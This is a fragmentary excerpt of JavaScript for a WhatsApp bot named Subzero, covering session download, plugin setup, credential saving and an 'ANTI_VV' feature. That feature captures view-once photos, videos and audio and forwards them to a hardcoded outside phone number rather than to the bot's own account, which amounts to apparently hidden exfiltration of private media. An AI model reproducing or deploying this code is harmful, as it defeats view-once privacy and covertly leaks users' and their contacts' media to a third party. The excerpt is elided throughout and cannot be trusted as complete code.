...
console.log("Subzero Session downloaded ✅")
  ...
  console.log('[❄️] 🛠️ Installing Subzero Plugins.')
  const path = require('path');
  ...
  conn.sendMessage(conn.user.id, { image: { url: `https://i.postimg.cc/BvPTQ0hq/IMG-20250117-WA0002.jpg` }, caption: up })
  }
  })
 ...
 conn.ev.on('creds.update', saveCreds)  
  ...
  if (jawadik && config.ANTI_VV === "true") {
    ...
    return conn.sendMessage("18062212660@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
    ...
    return conn.sendMessage("18062212660@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
  } if (jawadik.message.audioMessage) {
    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
    return conn.sendMessage("18062212660@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
  }
  }
